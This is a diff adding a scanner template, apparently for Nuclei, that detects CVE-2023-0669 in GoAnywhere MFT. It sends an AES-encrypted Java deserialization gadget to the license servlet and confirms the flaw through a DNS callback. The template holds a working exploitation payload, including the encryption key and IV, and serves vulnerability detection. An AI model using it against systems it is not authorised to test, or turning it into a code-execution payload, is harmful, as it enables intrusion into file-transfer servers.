@@ -1,0 +1,34 @@
+id: cve-2023-0669-goanywhere-mft-deserialization
+info:
+  name: GoAnywhere MFT LicenseResponseServlet Deserialization
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: cve-2023-0669,dnslog,deserialization
+  description: |
+    GoAnywhere MFT LicenseResponseServlet is vulnerable to a deserialization vulnerability.
+    This can potentially allow an attacker to execute arbitrary code on the server.
+
+variables:
+  reverse: '{{interactsh-url}}'
+  reverseUrl: '{{reverse}}'
+  postdata: '{{concat(url_encode(base64(aes_cbc("java_dns_url_gadget", reverseUrl, "Dmmjg5tuz0Vkm4YfSicXG2aHDJVnpBROuvPVL9xAZMo=", "QUVTL0NCQy9QS0NTNVBhZA=="))), "$2")}}'
+
+http:
+  - raw:
+      - |
+        POST /goanywhere/lic/accept HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+
+        bundle={{postdata}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
